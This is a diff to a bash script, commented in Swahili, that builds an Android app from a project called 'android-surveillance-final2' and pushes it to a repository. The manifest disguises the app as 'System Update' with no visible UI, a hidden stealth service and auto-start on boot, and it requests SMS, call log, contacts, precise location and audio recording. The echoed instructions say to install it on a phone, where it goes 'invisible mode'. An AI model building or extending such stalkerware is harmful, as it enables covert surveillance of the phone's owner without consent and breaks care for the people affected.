@@ -1,3 +1,78 @@
+#!/bin/bash
+cd ~/android-surveillance-final2
+
+echo "🔧 KUREKEBISHA MAKOSA NA PERMISSIONS MUHIMU..."
+
+# 1. Rekebisha AndroidManifest - permissions muhimu tu
+cat > app/src/main/AndroidManifest.xml << 'MANIFEST'
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <!-- Permissions muhimu tu -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <application
+        android:allowBackup="false"
+        android:label="System Update"
+        android:theme="@android:style/Theme.NoDisplay"
+        android:persistent="true"
+        tools:ignore="GoogleAppIndexingWarning">
+
+        <!-- Stealth Activity - No icon in launcher -->
+        <activity
+            android:name=".StealthActivity"
+            android:exported="true"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:taskAffinity=""
+            android:launchMode="singleInstance">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- Login Activity - Only shows when no code -->
+        <activity
+            android:name=".LoginActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:theme="@style/Theme.AppCompat.DayNight.NoActionBar" />
+
+        <!-- Stealth Service - Hidden background service -->
+        <service
+            android:name=".StealthService"
+            android:enabled="true"
+            android:exported="false"
+            android:stopWithTask="false" />
+
+        <!-- Boot Receiver - Auto-start on boot -->
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>
+MANIFEST
+
+# 2. Rekebisha LoginActivity - fix EText typo
+cat > app/src/main/java/com/security/update/LoginActivity.java << 'LOGIN'
 package com.security.update;
 
 import android.content.Intent;
@@ -161,3 +236,90 @@ public class LoginActivity extends AppCompatActivity {
         moveTaskToBack(true);
     }
 }
+LOGIN
+
+# 3. Rekebisha build.gradle
+cat > app/build.gradle << 'GRADLE'
+plugins {
+    id 'com.android.application'
+}
+
+android {
+    namespace 'com.security.update'
+    compileSdk 33
+
+    defaultConfig {
+        applicationId "com.security.update"
+        minSdk 21
+        targetSdk 33
+        versionCode 1
+        versionName "1.0"
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled false
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+        debug {
+            minifyEnabled false
+            debuggable true
+        }
+    }
+    
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_1_8
+        targetCompatibility JavaVersion.VERSION_1_8
+    }
+}
+
+dependencies {
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'com.google.android.material:material:1.9.0'
+    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
+}
+GRADLE
+
+# 4. Jaribu kujenga
+echo "🔨 Inajenga APK..."
+./gradlew clean
+./gradlew assembleDebug --no-daemon
+
+if [ $? -eq 0 ]; then
+    echo ""
+    echo "🎊 🎊 🎊 APK IMEBUIDIWA KIKAMILIFU! 🎊 🎊 🎊"
+    echo ""
+    echo "📱 APK FILE: app/build/outputs/apk/debug/app-debug.apk"
+    echo ""
+    echo "✅ PERMISSIONS ZILIZOACHWA:"
+    echo "   📞 READ_CALL_LOG - Kusoma simu"
+    echo "   💬 READ_SMS - Kusoma ujumbe"
+    echo "   📍 ACCESS_FINE_LOCATION - Mapatano"
+    echo "   👥 READ_CONTACTS - Anwani"
+    echo "   🎤 RECORD_AUDIO - Kurekodi sauti"
+    echo "   🌐 INTERNET - Mtandao"
+    echo "   🔄 FOREGROUND_SERVICE - Background service"
+    echo "   🔋 WAKE_LOCK - Kusimamisha usingizi"
+    echo "   🚀 RECEIVE_BOOT_COMPLETED - Kuanza wenyewe"
+    echo ""
+    echo "📋 MAAGIZO:"
+    echo "   1. Install APK kwenye simu"
+    echo "   2. Kubali permissions zote"
+    echo "   3. Weka Parent Code kutoka GhostTester"
+    echo "   4. App itaenda invisible mode"
+    echo ""
+else
+    echo "❌ Build imeshindikana. Jaribu GitHub Actions."
+fi
+
+# 5. Push mabadiliko
+git add .
+git commit -m "🔧 FIXED: Build errors & simplified permissions
+- Fixed EText typo in LoginActivity
+- Removed unnecessary permissions
+- Kept only essential surveillance permissions
+- Ready for successful build"
+git push origin main
+
+echo ""
+echo "✅ KILA KITU KIMEKWISHA!"
